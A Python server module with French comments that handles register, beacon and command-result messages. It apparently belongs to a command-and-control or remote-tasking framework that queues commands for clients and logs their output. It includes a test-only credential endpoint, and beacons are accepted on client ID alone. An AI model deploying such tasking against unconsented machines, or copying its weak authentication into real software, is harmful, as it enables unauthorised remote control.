from dataclasses import dataclass
import logging
from .commands import pop_command_for
from .clients import ClientManager
from .command_catalog import COMMANDS
import json
from dataclasses import asdict

@dataclass
class AdminProvisionRequest:
    pass
@dataclass
class RegisterRequest:
    client_id: str
    shared_key: str
    ip_private: str

@dataclass
class RegisterResponse:
    status: str
    session_token: str

@dataclass
class BeaconRequest:
    client_id: str

@dataclass
class BeaconResponse:
    command_id: str | None
    command: str | None

@dataclass
class CommandResult:
    command_id: str
    command_response: str
    status: str

class MessageError(Exception):
    pass


def decode_message(raw_bytes: bytes) -> RegisterRequest | BeaconRequest | CommandResult | AdminProvisionRequest:
    """Décode et valide le corps d'une requête POST."""
    try:
        data = json.loads(raw_bytes)
    except json.JSONDecodeError as e:
        raise MessageError(f"JSON invalide: {e}")

    if not isinstance(data, dict):
        raise MessageError("Le payload doit être un objet JSON")

    action = data.get("action")
    
    # ----- ONLY FOR TESTING PURPOSES : generate key -----
    if action == "admin_provision":
        return AdminProvisionRequest()
    #------------------------------------------------------

    if action == "register":
        return RegisterRequest(
            client_id=data.get("client_id"),
            shared_key=data.get("shared_key"),
            ip_private=data.get("ip_private"),
        )

    if action == "beacon":
        return BeaconRequest(
            client_id=data.get("client_id")
        )

    if action == "command_result":
        if not all(k in data for k in ("command_id", "command_response", "status")):
            raise MessageError("Missing fields for command_result")
        return CommandResult(
            command_id=data.get("command_id"),
            command_response=data.get("command_response"),
            status=data.get("status"),
        )

    raise MessageError(f"Action inconnue: {action!r}")


def handle_request(raw, ip_private, client_manager: ClientManager):
    try:
        msg = decode_message(raw)
    except MessageError as e:
        return 400, {"error": str(e)}
    
    
    if isinstance(msg, AdminProvisionRequest):
    # TEST UNIQUEMENT — à protéger/supprimer en prod
        if ip_private not in ("127.0.0.1", "::1"):
            return 403, {"error": "forbidden"}
        cid, key = client_manager.generate_client_credentials()
        return 200, {"client_id": cid, "shared_key": key}

    # ---------- register (premier POST) ----------
    if isinstance(msg, RegisterRequest):
        if not msg.client_id or not msg.shared_key:
            return 400, {"error": "client_id and shared_key required"}

        try:
            session_token = client_manager.register_client(
                msg.client_id, msg.shared_key, ip_private
            )
        except Exception as e:
            logging.exception("Erreur register_client")
            return 500, {"error": "internal error"}

        # register_client retourne (False, "raison") en cas d'échec
        if isinstance(session_token, tuple) and session_token[0] is False:
            return 400, {"error": session_token[1]}

        return 200, asdict(RegisterResponse(status="ok", session_token=session_token))

    # ---------- beacon (POSTs suivants) ----------
    if isinstance(msg, BeaconRequest):
        client_id = msg.client_id
        if not client_id:
            return 401, {"error": "missing client_id"}

        session = client_manager.session.get(client_id)
        if session is None:
            return 401, {"error": "unknown session"}
        if session.revoked:
            return 401, {"error": "session revoked"}

        client_manager.update_comm_status(client_id, error=False)

        cmd = pop_command_for(client_id, client_manager)
        if cmd is None:
            return 200, asdict(BeaconResponse(command_id=None, command=None))

        cmd_str = COMMANDS.get(cmd.action_type)
        if cmd_str is None:
            logging.warning("Unknown action_type %r for client %s",
                            cmd.action_type, client_id)

        return 200, asdict(BeaconResponse(command_id=cmd.command_id, command=cmd_str))

    # ---------- command_result ----------
    if isinstance(msg, CommandResult):
        logging.info("[result] cmd=%s status=%s response=%s", msg.command_id, msg.status, msg.command_response)
        return 200, {"status": "ok"}

    return 400, {"error": "unexpected message type"}